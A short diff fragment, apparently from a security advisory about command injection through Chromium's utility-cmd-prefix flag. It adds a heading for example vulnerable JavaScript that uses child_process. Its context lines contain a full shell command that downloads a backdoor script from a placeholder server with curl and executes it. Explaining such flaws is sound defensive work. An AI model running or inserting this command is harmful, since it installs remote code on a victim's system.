@@ -38,6 +38,8 @@ What happens is user just got compromised...
 chromium --utility-cmd-prefix='bash -c \" ls . ; curl http://someserver/backdoor.sh > backdoor.sh ; bash backdoor.sh ; ls . \"'
 ```
 
+Example vulnerable code:
+
 ```javascript
 const { spawn } = require("child_process");
 const fs = require("fs");
